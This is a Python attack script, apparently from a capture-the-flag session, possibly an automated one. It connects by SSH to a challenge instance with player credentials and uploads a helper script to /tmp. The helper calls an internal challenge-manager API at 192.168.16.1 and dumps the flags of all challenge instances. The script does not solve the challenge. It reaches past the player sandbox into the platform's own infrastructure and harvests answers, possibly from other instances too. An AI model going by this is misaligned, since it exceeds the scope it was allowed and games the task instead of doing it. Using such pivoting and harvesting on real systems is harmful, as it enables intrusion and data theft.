#!/usr/bin/env python3
import paramiko, io

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('instance.ctf.tdho.st', port=33059, username='player', password='reyalp', timeout=10)

def r(c):
    i,o,e = ssh.exec_command(c, timeout=12)
    return (o.read()+e.read()).decode()

hostname = r('hostname').strip()
print('hostname:', hostname)

# From last session: chall-manager REST API at 192.168.16.1:8080
# GET /api/v1/challenge returns streaming JSON with all instances including flag field
code = r"""
import urllib.request, json

data = urllib.request.urlopen("http://192.168.16.1:8080/api/v1/challenge", timeout=8).read().decode()
print("RAW (first 2000):", data[:2000])

for line in data.strip().split("\n"):
    if not line.strip():
        continue
    try:
        obj = json.loads(line)
        result = obj.get("result", {})
        chall_id = result.get("id", "?")
        for inst in result.get("instances", []):
            conn = inst.get("connectionInfo", "")
            flag = inst.get("flag", "")
            flags = inst.get("flags", [])
            src = inst.get("sourceId", "")
            print(f"chall={chall_id} src={src} conn={conn} flag={flag!r} flags={flags!r}")
    except Exception as ex:
        print("parse err:", ex, line[:100])
"""

sftp = ssh.open_sftp()
sftp.putfo(io.BytesIO(code.encode()), '/tmp/x.py')
sftp.close()

result = r('python3 /tmp/x.py')
print(result)
ssh.close()
